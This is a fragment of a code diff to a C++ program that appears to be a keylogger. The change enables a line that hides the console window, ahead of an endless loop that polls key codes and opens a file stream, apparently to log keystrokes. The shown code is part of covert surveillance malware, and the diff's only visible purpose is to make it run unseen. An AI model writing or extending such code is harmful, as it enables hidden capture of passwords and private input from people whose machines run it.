@@ -5,10 +5,9 @@
 
 int main() {
     // hide the window
-    //ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); 
-
-    // Run infinitely
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); 
     
+    // Run infinitely
 	std::fstream file;
     while(true) {
 		for (int key = 8; key <= 190; key++)
